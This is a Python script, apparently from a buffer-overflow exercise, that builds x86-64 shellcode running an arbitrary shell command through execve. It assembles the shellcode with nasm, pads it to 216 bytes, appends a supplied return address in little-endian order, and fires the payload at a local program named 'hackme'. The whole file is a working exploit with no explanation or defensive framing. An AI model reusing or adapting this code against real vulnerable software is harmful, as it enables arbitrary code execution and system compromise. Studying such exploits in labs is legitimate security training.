#!/usr/bin/python

import sys
import os
import subprocess

cmd = sys.argv[1]               # Command to be executed
target_address = sys.argv[2]    # Address of buffer
cmd_len = len(cmd)

# ~~~~~~~~~~~~ SHELLCODE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

shellcode="""
bits 64

section .text
global _start

_start:
    xor     rcx, rcx
    push    rcx
    mov     rcx, 0x68732f6e69622fff
    shr     rcx, 0x8
    push    rcx
    push    rsp
    pop     rdi

    xor     rcx, rcx
    push    rcx
    push    word 0x632d
    push    rsp
    pop     rbx

    xor     rcx, rcx
    push    rcx
    jmp     command

execve:
    pop     rdx
    push    rdx
    xor     byte [rdx+""" + str(cmd_len) + """], 0x58
    push    rbx                     ; push  "-c"
    push    rdi                     ; push  "/bin/sh"
    push    rsp                     
    pop     rsi                     

    xor     rdx, rdx                ; envp = NULL
    mov     al, 0x3B                ; execve
    syscall



command:
    call    execve
    data:   db """ + '"' + cmd + 'X"'


# ~~~~~~~~~~~~~~ ASSEMBLE SHELLCODE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

file =  open("assembly.asm", "w")
file.write(shellcode)
file.close()

os.system("nasm -f elf64 assembly.asm -o out.o")


# ~~~~~~~~~~~~ EXTRACT MACHINE CODE INSTRUCTIONS ~~~~~~~~~~~~~~~~~~~~

os.system("objcopy -O binary out.o out.bin")

# ~~~~~~~ CONVERT BINARY INSTRUCTIONS INTO HEX ~~~~~~~~~~~~~~~~~

shellcode = ""
count   = 0
payload = ""

file = open("out.bin", 'rb')

for byte in file.read():
    shellcode += "\\x" + byte.encode("hex")
    count += 1

file.close()

# ~~~~~~~~~~ BUILD PAYLOAD ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

payload += shellcode
payload += "A"*(216-count)  # Fill buffer with padding


# ~~~~~~~~~ PREPARE ADDRESS FOR LITTLE ENDIAN ~~~~~~~~~~~~~~~~~~~

address = target_address[2:]
address = [address[i:i+2] for i in range(0, len(address) - 1, 2)]
address = address[::-1]
address = "\\x" + "\\x".join(address)

payload += address


# ~~~~~~~~ SHELLCODE EXECUTION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

os.system("./hackme \"$(python -c 'print \"" + payload + "\"')\"")
